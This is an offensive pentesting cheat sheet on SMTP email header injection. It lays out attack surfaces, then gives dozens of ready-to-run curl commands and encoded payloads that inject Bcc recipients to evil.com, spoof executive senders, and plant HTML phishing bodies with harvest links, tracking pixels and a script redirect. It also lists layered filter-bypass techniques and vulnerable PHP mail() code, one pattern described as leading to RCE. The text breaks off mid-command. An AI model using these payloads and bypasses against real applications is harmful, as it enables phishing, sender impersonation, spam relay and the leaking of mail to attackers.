---
title: Email Header Injection Attack
description: Email Header Injection Attack techniques, payloads, bypass strategies, and exploitation methods for SMTP pentesting.
navigation:
  icon: i-lucide-mail-warning
  title: Email Header Injection Attack
---

## Email Header Injection Attack

::badge
**SMTP-HDR-INJECT-v3.0**
::

Email Header Injection abuses the CRLF (`\r\n`) boundary between SMTP headers. When an application passes unsanitized user input into any email header field, an attacker injects newline sequences to introduce arbitrary headers — adding hidden recipients, overriding content, spoofing senders, or achieving remote code execution through backend mailer flags.

::note
Every SMTP header terminates with `\r\n`. The header block ends with `\r\n\r\n` before the body. Injecting these sequences into user-controlled fields lets you escape one header context and fabricate entirely new ones the mail server will obey.
::

---

## SMTP Protocol Anatomy

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
┌──────────────────────────────────────────────────────┐
│                  SMTP ENVELOPE                       │
│  MAIL FROM: <sender@domain.com>                      │
│  RCPT TO: <recipient@domain.com>                     │
├──────────────────────────────────────────────────────┤
│                  MESSAGE HEADERS                     │
│  From: sender@domain.com\r\n                         │
│  To: recipient@domain.com\r\n                        │
│  Subject: Hello World\r\n                            │
│  Date: Mon, 01 Jan 2025 00:00:00 +0000\r\n          │
│  MIME-Version: 1.0\r\n                               │
│  Content-Type: text/plain; charset=UTF-8\r\n         │
│  X-Mailer: CustomApp/1.0\r\n                         │
│  \r\n  ← ─ ─ ─ BLANK LINE SEPARATES HEADERS/BODY    │
├──────────────────────────────────────────────────────┤
│                  MESSAGE BODY                        │
│  This is the email body content.                     │
│  .                                                   │
└──────────────────────────────────────────────────────┘
```

#code
```
SMTP Message Structure:
ENVELOPE → HEADERS (\r\n terminated) → BLANK LINE (\r\n\r\n) → BODY → PERIOD (.)
```
::

---

## Injection Flow Architecture

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
                    ┌─────────────────────────┐
                    │   ATTACKER INPUT FIELD   │
                    │  email / name / subject  │
                    └────────────┬────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │   INJECTION PAYLOAD      │
                    │  user@x.com\r\nBcc:evil  │
                    └────────────┬────────────┘
                                 │
                 ┌───────────────▼───────────────┐
                 │    APPLICATION MAIL FUNCTION   │
                 │  mail() / sendMail() / SMTP    │
                 │     NO INPUT SANITIZATION      │
                 └───────────────┬───────────────┘
                                 │
              ┌──────────────────▼──────────────────┐
              │        RAW SMTP MESSAGE BUILT        │
              │  From: user@x.com                    │
              │  Bcc: evil@attacker.com    ← INJECT  │
              │  To: admin@target.com                │
              │  Subject: Contact Form               │
              └──────────────────┬──────────────────┘
                                 │
              ┌──────────────────▼──────────────────┐
              │       SMTP SERVER PROCESSES          │
              │  Delivers to ALL recipients          │
              │  Including injected Bcc/Cc/To        │
              └──────────────────┬──────────────────┘
                                 │
                 ┌───────────────▼───────────────┐
                 │        IMPACT ACHIEVED         │
                 │  • Email to attacker mailbox   │
                 │  • Phishing via trusted domain │
                 │  • Spam relay abuse            │
                 │  • Body/content override       │
                 │  • RCE via sendmail flags      │
                 └───────────────────────────────┘
```

#code
```
Flow: User Input → No Validation → CRLF in Header → New Headers Fabricated → SMTP Delivers to Injected Targets
```
::

---

## Attack Surface Mapping

::card-group
  ::card
  ---
  title: Contact / Feedback Forms
  icon: i-lucide-mail
  ---
  `From`, `Reply-To`, `Subject`, `Name` fields passed into SMTP headers without sanitization. The most common and easily exploitable surface.
  ::

  ::card
  ---
  title: User Registration
  icon: i-lucide-user-plus
  ---
  Confirmation emails where user-supplied email or display name flows into `From`, `To`, or custom `X-` headers during account creation.
  ::

  ::card
  ---
  title: Password Reset Flows
  icon: i-lucide-key-round
  ---
  Reset token emails using user-controlled `email` parameter directly in `To` or `Reply-To` headers. Attacker can redirect reset links.
  ::

  ::card
  ---
  title: Newsletter / Subscribe
  icon: i-lucide-newspaper
  ---
  Subscription endpoints echoing the submitted email into SMTP headers for welcome or confirmation messages without validation.
  ::

  ::card
  ---
  title: Invite / Share Features
  icon: i-lucide-share-2
  ---
  "Invite a friend" or "Share via email" functions where attacker controls recipient address and sometimes the message subject or body.
  ::

  ::card
  ---
  title: REST / GraphQL APIs
  icon: i-lucide-webhook
  ---
  API endpoints accepting JSON/XML with email fields (`from`, `to`, `cc`, `replyTo`) passed to backend mailer services without stripping newlines.
  ::

  ::card
  ---
  title: Error / Alert Notifications
  icon: i-lucide-bell-ring
  ---
  Application error reporters or alert systems that include user-controlled data (usernames, input values) in notification email headers.
  ::

  ::card
  ---
  title: E-commerce Order Emails
  icon: i-lucide-shopping-cart
  ---
  Order confirmation and shipping notification emails where buyer name, email, or address fields are embedded in email headers.
  ::
::

---

## Injectable SMTP Headers

::collapsible

| Header | Purpose | Injection Impact |
| --- | --- | --- |
| `From` | Sender address | Sender spoofing, impersonation |
| `To` | Primary recipient | Add arbitrary recipients |
| `Cc` | Carbon copy | Add visible copy recipients |
| `Bcc` | Blind carbon copy | Add hidden recipients |
| `Reply-To` | Reply redirect | Redirect responses to attacker |
| `Subject` | Email subject | Override subject, social engineering |
| `Content-Type` | Body format | Switch to HTML, inject MIME |
| `Content-Transfer-Encoding` | Encoding method | Base64 body injection |
| `MIME-Version` | MIME declaration | Enable multipart/attachment |
| `X-Priority` | Email priority | Mark as urgent/high priority |
| `X-Mailer` | Mailer identification | Spoof legitimate mail client |
| `Importance` | Priority flag | Bypass spam priority filters |
| `Return-Path` | Bounce address | Redirect bounce notifications |
| `Disposition-Notification-To` | Read receipt | Get read confirmations |
| `X-Forwarded-To` | Forward address | Redirect forwarding |
| `List-Unsubscribe` | Unsubscribe link | Inject malicious unsubscribe URL |
| `Message-ID` | Unique identifier | Override message tracking |
| `In-Reply-To` | Thread reference | Insert into existing threads |
| `References` | Thread chain | Chain into email conversations |

::

---

## Core Injection Techniques

::tabs
  :::tabs-item{icon="i-lucide-syringe" label="CRLF Header Injection"}

  The fundamental attack — inject `\r\n` to terminate the current header and begin a new one.

  ::code-preview
  ---
  class: "[&>div]:*:my-0 [&>div]:*:w-full"
  ---

  ```
  BEFORE INJECTION:
  From: attacker@evil.com\r\n
  To: admin@target.com\r\n
  Subject: Hello\r\n

  AFTER INJECTION (email field = attacker@evil.com\r\nBcc:spy@evil.com):
  From: attacker@evil.com\r\n
  Bcc: spy@evil.com\r\n        ← INJECTED
  To: admin@target.com\r\n
  Subject: Hello\r\n
  ```

  #code
  ```
  Injection breaks header boundary → new header inserted → SMTP server obeys all headers
  ```
  ::

  ```bash
  # Inject Bcc via email field
  curl -X POST http://target.com/contact \
    -d "email=attacker@evil.com%0d%0aBcc:spy@evil.com" \
    -d "subject=Hello" \
    -d "message=Test"

  # Inject Cc via email field
  curl -X POST http://target.com/contact \
    -d "email=attacker@evil.com%0d%0aCc:spy@evil.com" \
    -d "subject=Hello" \
    -d "message=Test"

  # Inject additional To header
  curl -X POST http://target.com/contact \
    -d "email=attacker@evil.com%0d%0aTo:extra@evil.com" \
    -d "subject=Test" \
    -d "message=Test"

  # Inject Reply-To redirect
  curl -X POST http://target.com/contact \
    -d "email=legit@user.com%0d%0aReply-To:attacker@evil.com" \
    -d "subject=Question" \
    -d "message=Please reply"

  # Inject via name field
  curl -X POST http://target.com/contact \
    -d "name=John%0d%0aBcc:attacker@evil.com" \
    -d "email=john@test.com" \
    -d "subject=Hi" \
    -d "message=Test"

  # Inject via subject field
  curl -X POST http://target.com/contact \
    -d "email=test@test.com" \
    -d "subject=Hello%0d%0aBcc:attacker@evil.com" \
    -d "message=Test"
  ```

  :::

  :::tabs-item{icon="i-lucide-users" label="Multi-Recipient Injection"}

  Add multiple hidden or visible recipients to a single email.

  ```bash
  # Multiple Bcc recipients (comma separated)
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:user1@evil.com,user2@evil.com,user3@evil.com" \
    -d "subject=Test" \
    -d "message=Hello"

  # Multiple Bcc via separate headers
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:user1@evil.com%0d%0aBcc:user2@evil.com%0d%0aBcc:user3@evil.com" \
    -d "subject=Test" \
    -d "message=Hello"

  # Mix Cc and Bcc
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aCc:visible@evil.com%0d%0aBcc:hidden@evil.com" \
    -d "subject=Test" \
    -d "message=Hello"

  # Add To + Cc + Bcc simultaneously
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aTo:extra1@evil.com%0d%0aCc:extra2@evil.com%0d%0aBcc:extra3@evil.com" \
    -d "subject=Test" \
    -d "message=Hello"

  # Mass Bcc from file
  RECIPIENTS=$(cat recipients.txt | tr '\n' ',' | sed 's/,$//')
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:${RECIPIENTS}" \
    -d "subject=Notification" \
    -d "message=Content"
  ```

  :::

  :::tabs-item{icon="i-lucide-file-text" label="Body Injection"}

  Terminate headers with double CRLF and inject a completely new email body.

  ```bash
  # Inject plaintext body (double CRLF = end of headers)
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0a%0d%0aThis is the injected body content" \
    -d "subject=Test" \
    -d "message=Ignored"

  # Inject HTML body with Content-Type override
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><h1>Injected HTML</h1><p>This replaces the original body</p></body></html>" \
    -d "subject=Test" \
    -d "message=Ignored"

  # Full email hijack — spoofed sender + new subject + HTML body
  curl -X POST http://target.com/contact \
    -d "email=ceo@target.com%0d%0aSubject:Mandatory Policy Update%0d%0aContent-Type:text/html%0d%0aX-Priority:1%0d%0a%0d%0a<html><body style='font-family:Arial'><h2>Company Policy Update</h2><p>All employees must acknowledge the updated policy by clicking below:</p><a href='http://evil.com/harvest' style='padding:12px 24px;background:%230066cc;color:white;text-decoration:none;border-radius:4px'>Acknowledge Policy</a><br><br><small>Human Resources Department</small></body></html>" \
    -d "subject=Ignored" \
    -d "message=Ignored"

  # Body injection with tracking pixel
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aBcc:victim@target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body>Important message<img src='http://evil.com/track?id=victim' width='1' height='1' style='display:none'></body></html>" \
    -d "subject=Notice" \
    -d "message=Ignored"
  ```

  :::

  :::tabs-item{icon="i-lucide-paperclip" label="MIME & Attachment Injection"}

  Inject MIME multipart boundaries to attach files or create alternative body parts.

  ```bash
  # Inject multipart MIME with text attachment
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aMIME-Version:1.0%0d%0aContent-Type:multipart/mixed;boundary=BOUNDARY123%0d%0a%0d%0a--BOUNDARY123%0d%0aContent-Type:text/plain%0d%0a%0d%0aPlease see attachment.%0d%0a--BOUNDARY123%0d%0aContent-Type:text/plain;name=secrets.txt%0d%0aContent-Disposition:attachment;filename=secrets.txt%0d%0a%0d%0aSensitive data here%0d%0a--BOUNDARY123--" \
    -d "subject=Test" \
    -d "message=Ignored"

  # Inject HTML alternative view
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aMIME-Version:1.0%0d%0aContent-Type:multipart/alternative;boundary=ALT001%0d%0a%0d%0a--ALT001%0d%0aContent-Type:text/plain%0d%0a%0d%0aPlain text version%0d%0a--ALT001%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>HTML version with phishing link</h1><a href='http://evil.com'>Click</a>%0d%0a--ALT001--" \
    -d "subject=Test" \
    -d "message=Ignored"

  # Base64 encoded binary attachment injection
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aMIME-Version:1.0%0d%0aContent-Type:multipart/mixed;boundary=FILEBOUND%0d%0a%0d%0a--FILEBOUND%0d%0aContent-Type:text/plain%0d%0a%0d%0aSee attached.%0d%0a--FILEBOUND%0d%0aContent-Type:application/pdf;name=report.pdf%0d%0aContent-Transfer-Encoding:base64%0d%0aContent-Disposition:attachment;filename=report.pdf%0d%0a%0d%0aJVBERi0xLjQKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwo+PgplbmRvYmoK%0d%0a--FILEBOUND--" \
    -d "subject=Report" \
    -d "message=Ignored"

  # Inject embedded image in HTML body
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aMIME-Version:1.0%0d%0aContent-Type:multipart/related;boundary=IMGBOUND%0d%0a%0d%0a--IMGBOUND%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><h2>Report</h2><img src='cid:logo123'></body></html>%0d%0a--IMGBOUND%0d%0aContent-Type:image/png;name=logo.png%0d%0aContent-ID:<logo123>%0d%0aContent-Transfer-Encoding:base64%0d%0a%0d%0aiVBORw0KGgoAAAANSUhEUg==%0d%0a--IMGBOUND--" \
    -d "subject=Report" \
    -d "message=Ignored"
  ```

  :::

  :::tabs-item{icon="i-lucide-user-check" label="Sender Spoofing"}

  Override the `From` header to impersonate trusted internal senders.

  ```bash
  # Spoof From header
  curl -X POST http://target.com/contact \
    -d "email=anybody@test.com%0d%0aFrom:ceo@target.com" \
    -d "subject=Urgent Request" \
    -d "message=Need immediate action"

  # Spoof From with display name
  curl -X POST http://target.com/contact \
    -d "email=anybody@test.com%0d%0aFrom:CEO <ceo@target.com>" \
    -d "subject=Confidential" \
    -d "message=Wire transfer needed"

  # Spoof From + Reply-To combination
  curl -X POST http://target.com/contact \
    -d "email=x@test.com%0d%0aFrom:it-security@target.com%0d%0aReply-To:attacker@evil.com" \
    -d "subject=Password Expiry Notice" \
    -d "message=Your password expires today"

  # Spoof Return-Path for bounce capture
  curl -X POST http://target.com/contact \
    -d "email=x@test.com%0d%0aFrom:noreply@target.com%0d%0aReturn-Path:collector@evil.com" \
    -d "subject=Delivery Notification" \
    -d "message=Package status update"

  # Spoof Sender header (distinct from From in some MTAs)
  curl -X POST http://target.com/contact \
    -d "email=x@test.com%0d%0aSender:admin@target.com%0d%0aFrom:admin@target.com" \
    -d "subject=System Alert" \
    -d "message=Check your account"
  ```

  :::

  :::tabs-item{icon="i-lucide-bell" label="Priority & Threading Injection"}

  Manipulate priority flags and conversation threading to increase attack effectiveness.

  ```bash
  # Set high priority (multiple headers for compatibility)
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aX-Priority:1%0d%0aX-MSMail-Priority:High%0d%0aImportance:High%0d%0aPriority:urgent%0d%0aBcc:victim@target.com" \
    -d "subject=URGENT" \
    -d "message=Action required"

  # Inject into existing email thread via In-Reply-To
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aIn-Reply-To:<original-msg-id@target.com>%0d%0aReferences:<original-msg-id@target.com>%0d%0aBcc:attacker@evil.com" \
    -d "subject=Re: Project Update" \
    -d "message=Updated details attached"

  # Inject read receipt request
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aDisposition-Notification-To:tracker@evil.com%0d%0aReturn-Receipt-To:tracker@evil.com%0d%0aBcc:victim@target.com" \
    -d "subject=Important" \
    -d "message=Please confirm receipt"

  # Inject List-Unsubscribe with malicious URL
  curl -X POST http://target.com/contact \
    -d "email=test@test.com%0d%0aList-Unsubscribe:<http://evil.com/harvest?action=unsub>%0d%0aBcc:victim@target.com" \
    -d "subject=Newsletter" \
    -d "message=Latest updates"
  ```

  :::
::

---

## Comprehensive Payload Arsenal

::accordion
  :::accordion-item{icon="i-lucide-hash" label="URL Encoded Payloads"}

  ```bash
  # Standard CRLF
  %0d%0aBcc:attacker@evil.com

  # Carriage Return only
  %0dBcc:attacker@evil.com

  # Line Feed only
  %0aBcc:attacker@evil.com

  # CRLF with trailing CRLF
  %0d%0aBcc:attacker@evil.com%0d%0a

  # Tab character prefix
  %09%0d%0aBcc:attacker@evil.com

  # Null byte prefix
  %00%0d%0aBcc:attacker@evil.com

  # Space before header name
  %0d%0a%20Bcc:attacker@evil.com

  # Tab before header name (RFC folding)
  %0d%0a%09Bcc:attacker@evil.com

  # Multiple spaces after colon
  %0d%0aBcc:%20%20%20attacker@evil.com

  # Tab after colon
  %0d%0aBcc:%09attacker@evil.com

  # Vertical tab
  %0bBcc:attacker@evil.com

  # Form feed
  %0cBcc:attacker@evil.com
  ```

  :::

  :::accordion-item{icon="i-lucide-layers" label="Double & Triple Encoded Payloads"}

  ```bash
  # Double URL encoded CRLF
  %250d%250aBcc:attacker@evil.com

  # Double encoded CR only
  %250dBcc:attacker@evil.com

  # Double encoded LF only
  %250aBcc:attacker@evil.com

  # Triple URL encoded
  %25250d%25250aBcc:attacker@evil.com

  # Mixed encoding depth — CR double + LF single
  %250d%0aBcc:attacker@evil.com

  # Mixed encoding depth — CR single + LF double
  %0d%250aBcc:attacker@evil.com

  # Double encoded with space fold
  %250d%250a%2520Bcc:attacker@evil.com

  # Partial double encoding
  %250d%0aBcc:attacker@evil.com
  %0d%250aBcc:attacker@evil.com

  # Quadruple encoding (rare multi-decode)
  %2525250d%2525250aBcc:attacker@evil.com
  ```

  :::

  :::accordion-item{icon="i-lucide-globe" label="Unicode & Alternate Character Payloads"}

  ```bash
  # Unicode Next Line (NEL)
  %C2%85Bcc:attacker@evil.com

  # Unicode Line Separator (LS)
  %E2%80%A8Bcc:attacker@evil.com

  # Unicode Paragraph Separator (PS)
  %E2%80%A9Bcc:attacker@evil.com

  # Unicode CRLF equivalent
  \u000d\u000aBcc:attacker@evil.com

  # UTF-8 overlong 2-byte
  %C0%8D%C0%8ABcc:attacker@evil.com

  # UTF-8 overlong 3-byte
  %E0%80%8D%E0%80%8ABcc:attacker@evil.com

  # UTF-8 overlong 4-byte
  %F0%80%80%8D%F0%80%80%8ABcc:attacker@evil.com

  # Mixed overlong
  %C0%8D%0aBcc:attacker@evil.com
  %0d%C0%8ABcc:attacker@evil.com

  # HTML entities (when parsed by server)
  &#13;&#10;Bcc:attacker@evil.com
  &#x0d;&#x0a;Bcc:attacker@evil.com
  &#013;&#010;Bcc:attacker@evil.com

  # Backslash sequences (language dependent)
  \r\nBcc:attacker@evil.com
  \x0d\x0aBcc:attacker@evil.com
  \015\012Bcc:attacker@evil.com
  ```

  :::

  :::accordion-item{icon="i-lucide-terminal" label="Raw & Shell-Level Payloads"}

  ```bash
  # Literal newline in curl data
  curl -X POST http://target.com/contact \
    -d $'email=test@test.com\r\nBcc:attacker@evil.com' \
    -d "subject=Test" \
    -d "message=Hello"

  # printf for precise byte control
  printf 'email=test@test.com\r\nBcc:attacker@evil.com&subject=Test&message=Hello' | \
    curl -X POST http://target.com/contact -d @-

  # echo with escape interpretation
  echo -e 'email=test@test.com\r\nBcc:attacker@evil.com&subject=Test&message=Hello' | \
    curl -X POST http://target.com/contact -d @-

  # Hex bytes via xxd
  echo -n "email=test@test.com" > /tmp/payload.bin
  printf '\x0d\x0a' >> /tmp/payload.bin
  echo -n "Bcc:attacker@evil.com&subject=Test&message=Hello" >> /tmp/payload.bin
  curl -X POST http://target.com/contact -d @/tmp/payload.bin

  # Python one-liner for raw bytes
  python3 -c "
  import sys
  sys.stdout.buffer.write(b'email=test@test.com\r\nBcc:attacker@evil.com&subject=Test&message=Hello')
  " | curl -X POST http://target.com/contact -d @-
  ```

  :::

  :::accordion-item{icon="i-lucide-braces" label="JSON API Payloads"}

  ```json
  // Basic Bcc injection
  {
    "email": "test@test.com\r\nBcc:attacker@evil.com",
    "subject": "Test",
    "message": "Hello"
  }

  // Multi-header injection
  {
    "from": "test@test.com\r\nCc:spy@evil.com\r\nBcc:hidden@evil.com\r\nReply-To:attacker@evil.com",
    "to": "admin@target.com",
    "body": "Inquiry"
  }

  // Body override via JSON
  {
    "name": "Attacker\r\nBcc:dump@evil.com\r\nSubject:Overridden\r\n\r\nInjected Body Content",
    "email": "legit@user.com",
    "message": "Ignored"
  }

  // Unicode escape in JSON
  {
    "email": "test@test.com\u000d\u000aBcc:attacker@evil.com",
    "subject": "Test",
    "message": "Hello"
  }

  // Array-based injection attempt
  {
    "email": ["test@test.com", "attacker@evil.com"],
    "subject": "Test",
    "message": "Hello"
  }

  // Nested object injection
  {
    "email": {"address": "test@test.com\r\nBcc:attacker@evil.com"},
    "subject": "Test"
  }
  ```

  :::

  :::accordion-item{icon="i-lucide-case-sensitive" label="Case & Whitespace Variation Payloads"}

  ```bash
  # Mixed case header names
  %0d%0abcc:attacker@evil.com
  %0d%0aBCC:attacker@evil.com
  %0d%0abCc:attacker@evil.com
  %0d%0aBcC:attacker@evil.com

  # Space before colon
  %0d%0aBcc :attacker@evil.com
  %0d%0aBcc%20:attacker@evil.com

  # No space after colon
  %0d%0aBcc:attacker@evil.com

  # Multiple tabs after colon
  %0d%0aBcc:%09%09attacker@evil.com

  # Space-tab combination
  %0d%0aBcc:%20%09attacker@evil.com

  # Leading whitespace in header name
  %0d%0a%20Bcc:attacker@evil.com

  # Multiple leading spaces
  %0d%0a%20%20%20Bcc:attacker@evil.com

  # Null bytes within header name
  %0d%0aB%00cc:attacker@evil.com
  %0d%0aBc%00c:attacker@evil.com

  # Header name with dashes
  %0d%0aX-Bcc:attacker@evil.com
  ```

  :::
::

---

## Filter Bypass Strategies

::caution
Applications may implement basic newline stripping, regex filtering, or WAF rules. These techniques target specific weaknesses in sanitization logic.
::

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="Newline Variation Bypass"}

  ```
  BYPASS DECISION TREE:

  Filter strips \r\n ?
  ├── YES → Try \n only (LF)
  │         ├── Stripped? → Try \r only (CR)
  │         │               ├── Stripped? → Try vertical tab (\v / %0b)
  │         │               │               ├── Stripped? → Try form feed (\f / %0c)
  │         │               │               │               └── Try Unicode NEL (%C2%85)
  │         │               │               └── SUCCESS → Use %0b
  │         │               └── SUCCESS → Use %0d alone
  │         └── SUCCESS → Use %0a alone
  └── NO  → Use standard %0d%0a
  ```

  ```bash
  # Progressive bypass attempts
  # Level 1: Standard
  %0d%0aBcc:attacker@evil.com

  # Level 2: LF only
  %0aBcc:attacker@evil.com

  # Level 3: CR only
  %0dBcc:attacker@evil.com

  # Level 4: Vertical tab
  %0bBcc:attacker@evil.com

  # Level 5: Form feed
  %0cBcc:attacker@evil.com

  # Level 6: Unicode NEL
  %C2%85Bcc:attacker@evil.com

  # Level 7: Unicode Line Separator
  %E2%80%A8Bcc:attacker@evil.com

  # Level 8: Unicode Paragraph Separator
  %E2%80%A9Bcc:attacker@evil.com

  # Level 9: Null byte before newline
  %00%0d%0aBcc:attacker@evil.com

  # Level 10: Null between CR and LF
  %0d%00%0aBcc:attacker@evil.com
  ```

  :::

  :::tabs-item{icon="i-lucide-layers" label="Encoding Depth Bypass"}

  ```
  ENCODING BYPASS FLOW:

  Single encoding blocked?
  ├── Try double encoding (%250d%250a)
  │   ├── Blocked? → Try triple encoding (%25250d%25250a)
  │   │   └── Blocked? → Try mixed depth (%250d%0a or %0d%250a)
  │   └── SUCCESS
  └── SUCCESS with single encoding
  ```

  ```bash
  # Single encoded (baseline)
  %0d%0aBcc:target@evil.com

  # Double encoded
  %250d%250aBcc:target@evil.com

  # Triple encoded
  %25250d%25250aBcc:target@evil.com

  # Mixed depth — first char double, second single
  %250d%0aBcc:target@evil.com

  # Mixed depth — first char single, second double
  %0d%250aBcc:target@evil.com

  # UTF-8 overlong 2-byte
  %C0%8D%C0%8ABcc:target@evil.com

  # UTF-8 overlong 3-byte
  %E0%80%8D%E0%80%8ABcc:target@evil.com

  # UTF-8 overlong 4-byte
  %F0%80%80%8D%F0%80%80%8ABcc:target@evil.com

  # Half-width Katakana equivalents (exotic)
  %EF%BD%8D%EF%BD%8ABcc:target@evil.com
  ```

  :::

  :::tabs-item{icon="i-lucide-repeat" label="Header Folding Bypass"}

  ::note
  RFC 2822 allows a header to continue on the next line if that line starts with whitespace (space or tab). This folding mechanism can bypass filters that check for complete header names on a single line.
  ::

  ```bash
  # Standard folding — space continuation
  %0d%0a%20Bcc:attacker@evil.com

  # Tab continuation
  %0d%0a%09Bcc:attacker@evil.com

  # Multiple space continuation
  %0d%0a%20%20%20Bcc:attacker@evil.com

  # Mixed whitespace continuation
  %0d%0a%20%09%20Bcc:attacker@evil.com

  # Fold within value then new header
  test@test.com%0d%0a%20continued%0d%0aBcc:attacker@evil.com

  # Double fold
  %0d%0a%20%0d%0aBcc:attacker@evil.com

  # Fold + encoding bypass
  %250d%250a%2520Bcc:attacker@evil.com

  # Fold after injected header
  %0d%0aBcc:attacker@evil.com%0d%0a%20extra-value
  ```

  :::

  :::tabs-item{icon="i-lucide-split" label="MIME Boundary Bypass"}

  ```bash
  # Override Content-Type to multipart — entire body becomes attacker-controlled
  test@test.com%0d%0aContent-Type:multipart/mixed;boundary=PWNED%0d%0a%0d%0a--PWNED%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Phishing Content</h1><a href="http://evil.com">Click Here</a>%0d%0a--PWNED--

  # Multipart alternative for bypassing text-only viewers
  test@test.com%0d%0aContent-Type:multipart/alternative;boundary=ALT%0d%0a%0d%0a--ALT%0d%0aContent-Type:text/plain%0d%0a%0d%0aSafe looking text%0d%0a--ALT%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>location='http://evil.com'</script>%0d%0a--ALT--

  # Inject X-headers to bypass WAF header inspection
  test@test.com%0d%0aX-Originating-IP:127.0.0.1%0d%0aX-Forwarded-For:127.0.0.1%0d%0aBcc:attacker@evil.com

  # Return-Path + Bcc combo
  test@test.com%0d%0aReturn-Path:<attacker@evil.com>%0d%0aBcc:dump@evil.com
  ```

  :::

  :::tabs-item{icon="i-lucide-regex" label="Regex Filter Bypass"}

  ```bash
  # If filter blocks "Bcc:" — use alternate headers
  %0d%0aCc:attacker@evil.com
  %0d%0aTo:attacker@evil.com
  %0d%0aReply-To:attacker@evil.com

  # If filter blocks "@" in injected portion
  %0d%0aBcc:attacker%40evil.com

  # If filter blocks specific header names — mixed case
  %0d%0abcc:attacker@evil.com
  %0d%0aBCC:attacker@evil.com

  # If filter uses ^Bcc: regex — prepend space
  %0d%0a%20Bcc:attacker@evil.com

  # If filter strips first occurrence — inject twice
  %0d%0aBcc:decoy@decoy.com%0d%0aBcc:real@evil.com

  # If filter checks input length — use short payloads
  %0a%0aBcc:a@b.co

  # If filter validates email format — inject after valid email
  legitimate@target.com%0d%0aBcc:attacker@evil.com

  # Inject comment in header (RFC 2822 compliant)
  %0d%0aBcc:(comment)attacker@evil.com
  %0d%0aBcc:attacker@evil.com(comment)
  ```

  :::
::

---

## Language & Framework Exploitation

### PHP `mail()` Exploitation

::warning
PHP `mail()` is the most commonly exploited function. The 4th parameter (additional headers) and 5th parameter (additional parameters passed to sendmail) are both attack surfaces. The 5th parameter can lead directly to RCE.
::

::tabs
  :::tabs-item{icon="i-lucide-bug" label="Vulnerable Patterns"}

  ::code-tree{default-value="contact_v1.php"}

  ```php [contact_v1.php]
  <?php
  // Pattern 1: Direct header concatenation
  $to = "admin@target.com";
  $subject = $_POST['subject'];
  $message = $_POST['message'];
  $headers = "From: " . $_POST['email'];
  mail($to, $subject, $message, $headers);
  ?>
  ```

  ```php [contact_v2.php]
  <?php
  // Pattern 2: Multiple headers from user input
  $to = "admin@target.com";
  $subject = $_POST['subject'];
  $message = $_POST['message'];
  $headers  = "From: " . $_POST['email'] . "\r\n";
  $headers .= "Reply-To: " . $_POST['email'] . "\r\n";
  $headers .= "X-Sender-Name: " . $_POST['name'];
  mail($to, $subject, $message, $headers);
  ?>
  ```

  ```php [contact_v3.php]
  <?php
  // Pattern 3: 5th parameter exploitation (RCE)
  $to = "admin@target.com";
  $subject = $_POST['subject'];
  $message = $_POST['message'];
  $headers = "From: " . $_POST['email'];
  $params = "-f" . $_POST['email'];
  mail($to, $subject, $message, $headers, $params);
  ?>
  ```

  ```php [contact_v4.php]
  <?php
  // Pattern 4: Subject injection
  $to = $_POST['email'];
  $subject = "Contact: " . $_POST['subject'];
  $message = $_POST['message'];
  $headers = "From: noreply@target.com";
  mail($to, $subject, $message, $headers);
  ?>
  ```

  ```php [contact_v5.php]
  <?php
  // Pattern 5: Recipient injection via To field
  $to = $_POST['recipient'];
  $subject = "Newsletter";
  $message = "Welcome!";
  $headers = "From: newsletter@target.com";
  mail($to, $subject, $message, $headers);
  ?>
  ```

  ::

  :::

  :::tabs-item{icon="i-lucide-syringe" label="Header Exploitation"}

  ```bash
  # ---- Inject via email/From field (Pattern 1 & 2) ----

  # Add Bcc
  curl -X POST http://target.com/contact.php \
    -d "email=attacker@evil.com%0d%0aBcc:victim@target.com" \
    -d "subject=Hello" \
    -d "message=Test"

  # Add multiple recipients + override subject
  curl -X POST http://target.com/contact.php \
    -d "email=attacker@evil.com%0d%0aBcc:v1@target.com,v2@target.com%0d%0aSubject:Urgent Alert" \
    -d "subject=Ignored" \
    -d "message=Test"

  # Full hijack — From spoof + Bcc + HTML body
  curl -X POST http://target.com/contact.php \
    -d "email=admin@target.com%0d%0aBcc:allstaff@target.com%0d%0aContent-Type:text/html%0d%0aSubject:Security Notice%0d%0a%0d%0a<html><body><h2>Account Verification Required</h2><p><a href='http://evil.com/verify'>Verify Now</a></p></body></html>" \
    -d "subject=x" \
    -d "message=x"

  # ---- Inject via name field (Pattern 2) ----

  curl -X POST http://target.com/contact.php \
    -d "name=John%0d%0aBcc:attacker@evil.com%0d%0aReply-To:attacker@evil.com" \
    -d "email=john@test.com" \
    -d "subject=Hello" \
    -d "message=Test"

  # ---- Inject via subject field (Pattern 4) ----

  curl -X POST http://target.com/contact.php \
    -d "email=victim@target.com" \
    -d "subject=Hello%0d%0aBcc:attacker@evil.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Phishing</h1>" \
    -d "message=Ignored"

  # ---- Inject via recipient field (Pattern 5) ----

  curl -X POST http://target.com/contact.php \
    -d "recipient=legit@user.com%0d%0aBcc:attacker@evil.com%0d%0aCc:spy@evil.com" \
    -d "subject=Newsletter" \
